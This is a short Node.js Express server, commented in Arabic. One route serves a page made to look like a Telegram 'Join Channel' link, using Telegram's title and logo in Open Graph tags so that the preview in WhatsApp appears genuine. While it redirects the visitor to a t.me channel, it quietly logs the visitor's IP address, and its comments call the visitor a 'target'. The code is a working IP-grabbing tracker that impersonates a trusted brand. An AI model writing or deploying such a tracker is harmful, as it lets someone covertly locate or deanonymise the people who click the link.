const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/uUl8iPwh5iYTVk', (req, res) => {
    // 1. سحب الآي بي الخاص بالزائر وتسجيله
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log("Target Link Clicked! Visitor IP: " + visitorIp);
    
    // 2. إرسال صفحة HTML تحتوي على بيانات الشعار للواتساب + كود تحويل فوري
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <title>Telegram: Join Channel</title>
            
            <meta property="og:title" content="Telegram: Join Channel">
            <meta property="og:description" content="اضغط للانضمام إلى القناة الرسمية عبر تليغرام">
            <meta property="og:image" content="https://telegram.org/img/t_logo.png">
            <meta property="og:type" content="website">
            
            <script>
                window.location.href = "https://t.me/uUl8iPwh5iYTVk";
            </script>
        </head>
        <body>
            <p style="text-align: center; margin-top: 50px; font-family: sans-serif; color: #555;">جاري فتح تليغرام...</p>
        </body>
        </html>
    `);
});

app.get('/', (req, res) => {
    res.send('Server is active.');
});

app.listen(PORT, () => {
    console.log("Server is running...");
});
